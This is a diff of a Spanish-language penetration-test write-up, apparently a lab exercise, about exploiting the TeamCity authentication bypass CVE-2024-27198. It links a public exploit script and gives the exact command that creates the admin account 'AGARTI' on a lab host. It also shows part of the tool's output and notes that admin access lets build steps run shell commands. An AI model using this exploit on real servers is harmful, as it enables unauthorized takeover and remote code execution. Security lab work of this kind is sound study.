@@ -43,7 +43,7 @@ Mediante investigación OSINT encontramos una vulnerabilidad crítica (CVE-2024-
 
 Esta vulnerabilidad crítica con un base score de 9.8, permite ejecutar código malicioso con el cual podemos crear un nuevo usaurio y contraseña, los cuales serán almacenados y nos permitira acceso completo a la página web, el código lo podemos encontrar en la siguiente dirección: hxxps[://]github[.]com/yoryio/CVE-2024-27198/blob/main/CVE-2024-27198.py
 
-Una vez ejecutado el comando `python CVE-2024-27198.py -t http://10.128.148.36:50000/ -u AGARTI -p root` hemos creado un nuevo usuario (AGARTI) con una nueva contraseña (root). Lo que nos permite acceder a la página web.
+Una vez ejecutado el comando `python CVE-2024-27198.py -t http://10.128.148.36:50000/ -u AGARTI -p root` hemos creado un nuevo usuario con permisos de administrador (AGARTI) con una nueva contraseña (root). Lo que nos permite acceder a la página web.
 
 ```bash
 [+] Version Found:  2023.11.3 (build 147512)
@@ -72,7 +72,7 @@ Date: Mon, 22 Jun 2026 11:11:28 GMT
 ```
 ![](Evidencias_Visuales/accesstoken)
 
-Una vez dentro del sistema 
+Una vez dentro del sistema, y con un usuario con permisos de adminsitrador, podemos, dentro de TeamCity, crear un nuevo proyecto con el cual podremos ejecutar líneas de comandos.
 
 ![](Evidencias_Visuales/buildsteps)
 ![](Evidencias_Visuales/pool)
